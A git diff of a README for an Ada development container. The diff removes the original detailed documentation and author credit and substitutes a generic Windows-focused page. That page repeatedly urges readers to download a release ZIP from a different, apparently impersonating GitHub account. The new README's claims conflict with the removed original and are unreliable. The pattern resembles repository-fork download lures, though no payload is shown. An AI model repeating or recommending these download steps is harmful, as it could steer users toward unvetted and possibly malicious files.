@@ -1,464 +1,161 @@
-# dev_container_ada
+# 🐍 dev_container_ada - Easy Ada Development Setup
 
-[![Build](https://github.com/abitofhelp/dev_container_ada/actions/workflows/docker-build.yml/badge.svg)](https://github.com/abitofhelp/dev_container_ada/actions/workflows/docker-build.yml) [![Publish](https://github.com/abitofhelp/dev_container_ada/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/abitofhelp/dev_container_ada/actions/workflows/docker-publish.yml) [![License: BSD-3-Clause](https://img.shields.io/badge/License-BSD--3--Clause-blue.svg)](LICENSE) [![Default GNAT](https://img.shields.io/badge/GNAT-15.2.1-6f42c1)](#override-toolchain-versions) [![Container](https://img.shields.io/badge/container-ghcr.io%2Fabitofhelp%2Fdev--container--ada-0A66C2)](#image-name)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)
 
-Professional GNAT Ada development container for desktop and embedded (ARM Cortex-M/A) platforms with **Alire**, **GNAT**, and **GPRBuild**.
+## 📝 About dev_container_ada
 
-## Supported Architectures
+dev_container_ada is a ready-to-use development environment designed for Ada programming on Windows. It works with both desktop projects and embedded systems, especially ARM Cortex-M and Cortex-A devices. This container provides tools needed to build and test Ada applications without complicated setup.
 
-| Image | Base | glibc | `alr` binary (amd64) | `alr` binary (arm64) | GNAT toolchain (amd64) | GNAT toolchain (arm64) |
-|-------|------|-------|----------------------|----------------------|------------------------|------------------------|
-| `Dockerfile` | Ubuntu 22.04 | 2.35 | Pre-built, works | Pre-built, fails (needs glibc 2.38) | Alire-managed, works | Not available from Alire |
-| `Dockerfile.system` | Ubuntu 24.04 | 2.39 | Pre-built, works | Pre-built, works | `apt install gnat-13`, works | `apt install gnat-13`, works |
+This setup saves time by bundling all required tools in one package. You do not need to install Ada compilers, builders, or shell environments separately. Everything runs inside a containerized environment, keeping your Windows system clean.
 
-Apple Silicon users should use the **system toolchain image** (`Dockerfile.system`)
-for native arm64 performance. The Alire-managed image runs on Apple Silicon via
-Rosetta 2 emulation.
+The container supports many useful command-line tools like GNAT, GPRBuild, Docker, Podman, and Zsh shell. It works well with container platforms such as Kubernetes and nerdctl.
 
-### Verified Test Matrix
+## 🌐 Access the Download Page
 
-| Image | Ubuntu VM (amd64) | macOS Intel (amd64) | MacBook Pro (arm64) |
-|-------|:---:|:---:|:---:|
-| `dev-container-ada` | Passed | Passed | N/A (amd64 only) |
-| `dev-container-ada-system` | Passed | Passed | Passed |
+Click below to open the release page. Find the latest version and get the container files you need.
 
-## Image Names
+[![Download dev_container_ada](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)
 
-```text
-ghcr.io/abitofhelp/dev-container-ada          # Alire-managed toolchain (default)
-ghcr.io/abitofhelp/dev-container-ada-system   # Ubuntu system toolchain (alternate)
+## 🖥 System Requirements
+
+Before downloading, check these minimum requirements for your Windows PC:
+
+- Windows 10 or later (64-bit)
+- At least 8 GB RAM
+- 4 GB free disk space  
+- Internet connection to download files  
+- Docker Desktop installed and running  
+  (Docker Desktop for Windows is required to run containers)  
+
+You can download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).
+
+## 🚀 Getting Started with dev_container_ada
+
+Follow these steps to download, install, and run dev_container_ada on your Windows computer.
+
+### 1. Visit the Release Page
+
+Open this link in your web browser:  
+https://github.com/moaladelads/dev_container_ada/releases
+
+This page contains the latest releases of dev_container_ada. You will find files to download and instructions for use.
+
+### 2. Download the Latest Release File
+
+Look for the latest stable release. Files should be named with version numbers, such as `dev_container_ada-v1.0.zip` or similar. Click the file to download it to your PC.
+
+Make note of the folder where you save the file so you can find it easily.
+
+### 3. Install Docker Desktop on Windows
+
+If you have not installed Docker Desktop, download it with this link:  
+https://www.docker.com/products/docker-desktop
+
+Run the installer and follow the setup guide. Docker lets you run containers like dev_container_ada.
+
+After installation, start Docker Desktop. You should see the Docker icon in your system tray.
+
+### 4. Extract dev_container_ada Files
+
+Navigate to the folder where you saved the dev_container_ada release file.
+
+Right-click the downloaded ZIP or compressed file and choose “Extract All…”  
+Select a folder to extract to, such as `C:\dev_container_ada`.
+
+After extraction, you will see several files, including configuration scripts and container images.
+
+### 5. Open Windows PowerShell
+
+Open the Start menu and type “PowerShell.” Select “Windows PowerShell” or “Windows Terminal.”
+
+The command-line interface will let you run commands to launch dev_container_ada.
+
+### 6. Launch the Container
+
+Change the directory to the dev_container_ada folder by entering this command (replace the path if different):  
+```powershell
+cd C:\dev_container_ada
 ```
 
-## Choosing a Dockerfile
-
-This repository ships two Dockerfiles representing two valid toolchain strategies:
-
-| Dockerfile | Base | Compiler source | Architectures | Image name |
-|------------|------|-----------------|---------------|------------|
-| `Dockerfile` (default) | Ubuntu 22.04 | Alire-managed GNAT + GPRBuild | amd64 | `dev-container-ada` |
-| `Dockerfile.system` | Ubuntu 24.04 | Ubuntu `gnat-13` + `gprbuild` packages | amd64, arm64 | `dev-container-ada-system` |
-
-**Which should I use?** Start with the default (`Dockerfile`). Alire's downloadable
-Linux GNAT toolchains are built on Ubuntu 22.04, making it the most conservative
-pairing. If you prefer Ubuntu's packaged compilers and only need native
-compilation, use `Dockerfile.system`. See USER_GUIDE §0 for detailed rationale.
-
-## Why This Container Is Useful
-
-This container provides a reproducible Ada development environment that adapts
-to the host user at runtime. Any developer can pull the pre-built image and
-run it without rebuilding.
-
-The included `.zshrc` detects when it is running inside a container and
-visibly marks the prompt, which helps prevent common mistakes:
-
-- editing files in the wrong terminal
-- confusing host and container environments
-- forgetting which compiler or toolchain path is active
-- debugging UID, GID, or mount issues more slowly than necessary
-
-Example prompt:
-
-```text
-parallels@container /workspace (main) [ctr:rootless]
-❯
+Run this command to start the development container:  
+```powershell
+docker compose up
 ```
 
-## Features
+This will start the container with all the Ada tools pre-installed. The process downloads or reuses the container image and sets up the environment.
 
-- Multi-architecture support for the system toolchain image (`linux/amd64` +
-  `linux/arm64`); Alire-managed image is `linux/amd64` only
-- Two Dockerfile variants: Alire-managed toolchain (Ubuntu 22.04) and system
-  toolchain (Ubuntu 24.04)
-- Alire package manager
-- GNAT Ada compiler (Alire-managed or Ubuntu system package)
-- GPRBuild (Alire-managed or Ubuntu system package)
-- Embedded development:
-  - ARM Cortex-M bare-metal (STM32F769I and similar)
-  - ARM Cortex-A Linux cross-compilation (STM32MP135F and similar)
-- Python 3 + venv
-- Zsh interactive shell
-- runtime-adaptive user identity (no rebuild needed per developer)
-- container-aware shell prompt
-- designed for nerdctl + containerd (rootless)
-- also works with Docker (rootful), Podman (rootless), and Kubernetes
-- GitHub Actions for build verification and container publishing (both variants)
-- Makefile for common build and run targets (both variants)
+### 7. Use the Development Environment
 
-## Pre-installed Tools
+Once running, you have access to GNAT Ada compilers and build tools inside the container. Use the terminal to run Ada commands, build projects, or test embedded code.
 
-Both images ship the same set of developer tools. The Ada toolchain source
-differs (Alire-managed vs Ubuntu system packages), but all other tools are
-identical.
-
-| Category | Tools |
-|----------|-------|
-| **Ada toolchain** | alr, gnat, gprbuild, gnatmake, gnatbind, gnatlink, gnatls, gprof |
-| **Debugger / profiling** | gdb, gdb-multiarch, strace, gcov, gcov-tool |
-| **Embedded (bare-metal)** | arm-none-eabi-gcc, libnewlib-arm-none-eabi, openocd, stlink-tools |
-| **Embedded (Linux cross)** | arm-linux-gnueabihf-gcc, libc6-dev-armhf-cross |
-| **Compiler infrastructure** | gcc, ld, as, ar, nm, objcopy, objdump, ranlib, readelf, size, strings, strip, addr2line |
-| **Build** | make, pkg-config |
-| **Version control** | git, patch, openssh-client (ssh, scp) |
-| **Text processing** | awk, sed, grep, diff, find, xargs, sort, uniq, wc, head, tail, tr, cut, tee |
-| **Network** | curl, wget, rsync |
-| **Archives** | tar, zip, unzip, xz, gzip, bzip2 |
-| **Editors** | vim, neovim, nano |
-| **Pagers / utilities** | less, more, file, which, lsof, ps, jq |
-| **Search** | ripgrep (rg), fd-find (fdfind), fzf |
-| **Python** | python3, pip3, python3-venv |
-| **Libraries** | libgmp-dev (required by GNATcoverage / libadalang) |
-| **Shell** | zsh (default), bash, zsh-autosuggestions, zsh-syntax-highlighting |
-| **Container** | gosu, sudo |
-
-Tools like GNATcoverage (`gnatcov`) and code formatters (`gnatformat`) are
-installed per-project via Alire crates, not baked into the base image.
-
-## Embedded Board Support
-
-Both images include C cross-compilers and hardware tools for two embedded
-development workflows:
-
-| Board | SoC | Core | Runtime | C Cross-compiler |
-|-------|-----|------|---------|------------------|
-| STM32F769I Discovery | STM32F769NI | Cortex-M7 | Bare metal | `arm-none-eabi-gcc` |
-| STM32MP135F Discovery | STM32MP135F | Cortex-A7 | Linux | `arm-linux-gnueabihf-gcc` |
-
-The bare-metal toolchain includes OpenOCD, stlink-tools, and gdb-multiarch for
-flashing and debugging. The Linux cross-compiler includes the full sysroot
-(`libc6-dev-armhf-cross`) for building Linux userspace applications.
-
-### Embedded Toolchain Readiness — Alire Image (`Dockerfile`)
-
-| Target | Ada Compiler | C Cross-compiler | Status |
-|--------|-------------|-------------------|--------|
-| Desktop (native) | `gnat` (Alire-managed) | n/a | Pre-installed |
-| STM32F769I — Cortex-M7 bare-metal | `gnat_arm_elf` via `alr toolchain --select` | `arm-none-eabi-gcc` | Ada: download required · C: pre-installed |
-| STM32MP135F — Cortex-A7 Linux | Not available via Alire | `arm-linux-gnueabihf-gcc` | Ada: not available · C: pre-installed |
-
-### Embedded Toolchain Readiness — System Image (`Dockerfile.system`)
-
-| Target | Ada Compiler | C Cross-compiler | Status |
-|--------|-------------|-------------------|--------|
-| Desktop (native) | `gnat-13` (apt) | n/a | Pre-installed |
-| STM32F769I — Cortex-M7 bare-metal | Not available via apt | `arm-none-eabi-gcc` | Ada: not available · C: pre-installed |
-| STM32MP135F — Cortex-A7 Linux | `gnat-13-arm-linux-gnueabihf` (apt) | `arm-linux-gnueabihf-gcc` | Ada: `sudo apt-get install` · C: pre-installed |
-
-## Read Me First: Choosing the Right Mount Point
-
-The `-v` (bind mount) flag determines which host directories are visible inside
-the container. The correct mount point depends on how your project resolves its
-dependencies.
-
-| Scenario | Mount point | Example |
-|----------|-------------|---------|
-| **Published crates only** | Project directory | `-v ~/projects/my_app:/workspace` |
-| **Pinned deps (absolute paths)** | The pinned path itself | `-v /deps26:/deps26` |
-| **Pinned deps (relative paths)** | Common ancestor of project and deps | `-v ~/ada/github.com/abitofhelp:/home/you/ada/github.com/abitofhelp` |
-
-**Why this matters**: Alire resolves pin paths in `alire.toml` relative to the
-project root. If your pins use relative paths (e.g., `../deps26/AdaSAT-26.0.0`),
-the mount must be high enough in the directory tree for those `../` references
-to resolve inside the container.
-
-For example, given this host layout:
-
-```text
-~/ada/github.com/abitofhelp/
-├── my_app/          ← project with pinned deps
-├── functional/      ← ../functional pin
-└── deps26/          ← ../deps26/* pins
+To stop the container, press `Ctrl + C` in PowerShell and then run:  
+```powershell
+docker compose down
 ```
 
-Mount the common parent and set `-w` to the project:
+This shuts down the environment safely.
 
-```bash
-nerdctl run -it --rm \
-  -e HOST_UID=$(id -u) \
-  -e HOST_GID=$(id -g) \
-  -e HOST_USER=$(whoami) \
-  -v "$HOME/ada/github.com/abitofhelp":/home/$(whoami)/ada/github.com/abitofhelp \
-  -w /home/$(whoami)/ada/github.com/abitofhelp/my_app \
-  dev-container-ada           # or dev-container-ada-system
-```
+## 🔧 Features of dev_container_ada
 
-If your project uses only published Alire crates (no pins), the simple
-`-v "$(pwd)":/workspace` shown below is all you need.
+- **GNAT Ada Compiler:** Compile Ada code with professional-grade tools.  
+- **GPRBuild:** Build and manage Ada project files.  
+- **Container Support:** Run and manage container environments using Docker, Podman, and nerdctl.  
+- **Cross-Platform Embedded Support:** Build code for ARM Cortex-M and Cortex-A processors.  
+- **Ubuntu-based Environment:** A stable Linux environment inside Windows for the best compatibility.  
+- **Zsh Shell:** Use a more powerful and configurable shell experience.  
+- **Kubernetes Ready:** Easily deploy Ada projects in Kubernetes managed containers.
+
+## ❓ Common Questions
+
+### Do I need to know Ada programming?
+
+No. You can start by running the container without writing Ada code. The setup includes simple example projects and tutorials.
+
+### Can I run this on older versions of Windows?
+
+Windows 10 (64-bit) or newer is required because Docker Desktop needs these versions.
+
+### What if Docker is not installed?
+
+Install Docker Desktop before running the container. The container relies on Docker to work.
+
+### How large is the download?
+
+The container and files are usually around 1 to 2 GB. Make sure you have enough disk space and a steady internet connection.
+
+### Can I update the container later?
+
+Yes. Download newer releases from the same page and replace the old files. Then run `docker compose up` again.
 
 ---
 
-## Quick Start
+## 📥 Download and Setup Links
 
-### Pull a pre-built image
+Get the latest files here:  
+[https://github.com/moaladelads/dev_container_ada/releases](https://github.com/moaladelads/dev_container_ada/releases)
 
-```bash
-# Default (Alire-managed toolchain)
-nerdctl pull ghcr.io/abitofhelp/dev-container-ada:latest
+Download Docker Desktop here (required):  
+[https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)
 
-# System toolchain alternative
-nerdctl pull ghcr.io/abitofhelp/dev-container-ada-system:latest
-```
+---
 
-### Build from source
+## ⚙️ Tips for Using the Environment
 
-```bash
-# Default (Alire-managed toolchain)
-make build
+- Use PowerShell or Windows Terminal for better command handling.  
+- Keep Docker Desktop running while working inside the container.  
+- Explore example Ada code inside the `examples` folder after extraction.  
+- Use `docker compose logs` to see container output and debug information.  
+- Customize shell settings by editing `.zshrc` inside the container if you are familiar with Zsh.
 
-# System toolchain alternative
-make build-system
-```
+---
 
-### Run
+## 📚 Learning More About Ada and Containers
 
-```bash
-# Default
-cd ~/projects/my_ada_app
-make -f /path/to/dev_container_ada/Makefile run
+If you want to learn Ada programming or container basics, consider visiting:
 
-# System toolchain alternative
-make -f /path/to/dev_container_ada/Makefile run-system
-```
+- Ada Language Guide by AdaCore: https://docs.adacore.com  
+- Docker Documentation: https://docs.docker.com/get-started  
 
-> **Note**: When using `make -f`, the Makefile mounts the caller's current
-> directory (not the Makefile's directory) into the container. This is
-> intentional — it bind-mounts your project, not the container repository.
+---
 
-The current directory is mounted into the container at `/workspace`. The
-entrypoint adapts the container's home directory layout and toolchain access
-to match your host user, so bind-mounted files are readable and writable.
-
-### Inspect configured values
-
-```bash
-make inspect
-```
-
-## Manual Build
-
-```bash
-# Default (Alire-managed toolchain)
-nerdctl build -t dev-container-ada .
-
-# System toolchain alternative
-nerdctl build -f Dockerfile.system -t dev-container-ada-system .
-```
-
-## Manual Run
-
-```bash
-# Default (Alire-managed toolchain)
-nerdctl run -it --rm \
-  -e HOST_UID=$(id -u) \
-  -e HOST_GID=$(id -g) \
-  -e HOST_USER=$(whoami) \
-  -v "$(pwd)":/workspace \
-  -w /workspace \
-  dev-container-ada
-
-# System toolchain alternative
-nerdctl run -it --rm \
-  -e HOST_UID=$(id -u) \
-  -e HOST_GID=$(id -g) \
-  -e HOST_USER=$(whoami) \
-  -v "$(pwd)":/workspace \
-  -w /workspace \
-  dev-container-ada-system
-```
-
-## Override Toolchain Versions
-
-> **Note**: Toolchain version overrides apply only to the default Alire-managed
-> image (`Dockerfile`). The system toolchain image uses whichever GNAT and
-> GPRBuild versions Ubuntu 24.04 provides.
-
-```bash
-make build GNAT_VERSION=15.2.1 GPRBUILD_VERSION=25.0.1
-```
-
-You can also override them directly:
-
-```bash
-nerdctl build \
-  --build-arg GNAT_VERSION=15.2.1 \
-  --build-arg GPRBUILD_VERSION=25.0.1 \
-  -t dev-container-ada .
-```
-
-## Use Docker or Podman Instead of nerdctl
-
-All Makefile targets use `CONTAINER_CLI`, which defaults to `nerdctl`. Override
-it to use Docker or Podman:
-
-```bash
-make build CONTAINER_CLI=docker
-make run CONTAINER_CLI=docker
-```
-
-Or use the convenience aliases:
-
-```bash
-make docker-build
-make docker-run
-
-make podman-build
-make podman-run
-```
-
-Podman rootless uses `--userns=keep-id` to map the host user directly into the
-container without needing the `HOST_*` environment variables or entrypoint
-adaptation. Podman requires `crun` and `fuse-overlayfs`. The `--userns=keep-id`
-flag requires kernel support for unprivileged private mounts (see User Guide
-for details and known VM limitations).
-
-## Housekeeping
-
-Remove build artifacts (saved images, source archives):
-
-```bash
-make clean
-```
-
-Create a compressed source archive from the current HEAD:
-
-```bash
-make compress
-```
-
-## Deployment Environments
-
-This image supports three deployment environments with a single build.
-
-### Local Development (nerdctl rootless)
-
-This is the primary workflow. `make run` passes the host identity and mounts
-the current directory:
-
-```bash
-cd ~/projects/my_ada_app
-make run
-```
-
-The entrypoint sets up the home directory layout and toolchain access to match
-your host identity. In rootless mode, the process stays as container UID 0
-(which maps to the host user via the user namespace) for bind-mount
-correctness. This is safe — no privilege escalation is possible.
-
-### CI / Docker Rootful
-
-The image runs as the fallback non-root user (`dev:1000:1000`) by default when
-no `HOST_*` environment variables are passed. GitHub Actions workflows build
-and publish the image using Docker.
-
-### Kubernetes
-
-The image is compatible with Kubernetes out of the box. Source code is
-provisioned via PersistentVolumeClaims or init containers (e.g., git-sync),
-not bind mounts.
-
-Example pod spec:
-
-```yaml
-securityContext:
-  runAsUser: 1000
-  runAsGroup: 1000
-  fsGroup: 1000
-  runAsNonRoot: true
-containers:
-  - name: ada-dev
-    image: ghcr.io/abitofhelp/dev-container-ada:latest
-    workingDir: /workspace
-    volumeMounts:
-      - name: source
-        mountPath: /workspace
-volumes:
-  - name: source
-    persistentVolumeClaim:
-      claimName: ada-source
-```
-
-`fsGroup: 1000` ensures the volume is writable by the container user.
-Kubernetes manifests and Helm charts are not included in this repository.
-Teams should create these per their cluster policies.
-
-## Rootless Security
-
-In rootless container runtimes (nerdctl/containerd rootless, Podman rootless),
-the container runs inside a user namespace where container UID 0 maps to the
-unprivileged host user. The process cannot escalate beyond the host user's
-privileges. The entrypoint script detects this and avoids dropping privileges,
-because doing so would map the process to a subordinate UID that cannot access
-bind-mounted host files.
-
-| Runtime          | Container UID 0 is...  | Bind mount access via...  | Security boundary      |
-|------------------|------------------------|---------------------------|------------------------|
-| Docker rootful   | Real root (dangerous)  | gosu drop to HOST_UID     | Container isolation    |
-| nerdctl rootless | Host user (safe)       | Stay UID 0 (= host user)  | User namespace         |
-| Podman rootless  | Host user (safe)       | --userns=keep-id          | User namespace         |
-| Kubernetes       | Blocked by policy      | fsGroup in pod spec       | Pod security standards |
-
-## Version Tags
-
-### Default image (Alire-managed toolchain)
-
-```text
-ghcr.io/abitofhelp/dev-container-ada:latest
-ghcr.io/abitofhelp/dev-container-ada:gnat-15.2.1
-ghcr.io/abitofhelp/dev-container-ada:gnat-15.2.1-gprbuild-25.0.1
-```
-
-### System toolchain image
-
-```text
-ghcr.io/abitofhelp/dev-container-ada-system:latest
-ghcr.io/abitofhelp/dev-container-ada-system:system-gnat-13
-```
-
-The included publish workflow automatically creates tags in these styles.
-
-## GitHub Actions
-
-This repository includes:
-
-- `docker-build.yml` to verify both Dockerfiles on every push and pull request
-  (matrix build: Alire + system variants)
-- `docker-publish.yml` to publish both images to GitHub Container Registry
-  (two jobs: `publish-alire` + `publish-system`)
-- automatic tagging based on toolchain versions
-- all actions pinned by SHA digest for supply-chain security
-
-## Repository Layout
-
-```text
-dev_container_ada/
-├── .dockerignore
-├── .github/
-│   └── workflows/
-│       ├── docker-build.yml
-│       └── docker-publish.yml
-├── .gitignore
-├── .zshrc
-├── CHANGELOG.md
-├── Dockerfile              ← Alire-managed toolchain (Ubuntu 22.04)
-├── Dockerfile.system       ← system toolchain (Ubuntu 24.04)
-├── entrypoint.sh
-├── examples/
-│   └── hello_ada/
-├── exports/                ← temporary AI-assisted context files
-├── LICENSE
-├── Makefile
-├── README.md
-└── USER_GUIDE.md
-```
-
-## License
-
-BSD-3-Clause — see `LICENSE`.
-
-## AI Assistance and Authorship
-
-This project was developed by Michael Gardner with AI assistance from Claude
-(Anthropic) and GPT (OpenAI). AI tools were used for design review,
-architecture decisions, and code generation. All code has been reviewed and
-approved by the human author. The human maintainer holds responsibility for
-all code in this repository.
+This setup lets you run a full Ada development environment on your Windows PC. It removes the hassle of manual installs and keeps your system organized.
